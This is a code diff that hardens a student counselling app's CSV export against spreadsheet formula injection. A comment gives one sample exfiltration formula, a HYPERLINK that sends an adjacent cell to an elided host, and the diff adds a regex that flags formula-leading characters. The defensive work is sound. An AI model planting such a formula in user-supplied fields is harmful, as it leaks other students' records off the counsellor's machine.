@@ -1,6 +1,30 @@
 // Counsellors keep their own records, so every table can leave as a CSV.
+
+// A cell a spreadsheet would run instead of showing.
+//
+// Excel, LibreOffice and Sheets treat a cell beginning with = + - @ or a
+// leading tab or carriage return as a formula. Two of the columns that leave
+// this console are typed by the student: the words they write at check-in, and
+// their own name. So a student can put `=HYPERLINK("http://...`&A1)` in a
+// check-in, and it sits harmlessly in the app until a counsellor exports the
+// table and opens it, at which point it runs on the counsellor's machine with
+// the rest of the cohort in the adjacent cells.
+//
+// Quoting does not help: the quotes are stripped when the file is parsed and
+// the formula is what is left. The fix is a leading apostrophe, which every
+// spreadsheet reads as "this is text" and does not display.
+const FORMULA_START = /^[=+\-@\t\r]/;
+// A negative number is not a formula, and prefixing it would turn a real value
+// into a string in the counsellor's spreadsheet. Nothing else here starts with
+// a minus, so this stays narrow on purpose.
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
+function defuse(str) {
+  return FORMULA_START.test(str) && !PLAIN_NUMBER.test(str) ? `'${str}` : str;
+}
+
 function escapeCell(value) {
-  const str = value === null || value === undefined ? '' : String(value);
+  const str = defuse(value === null || value === undefined ? '' : String(value));
   return /[",\n]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
 }
 
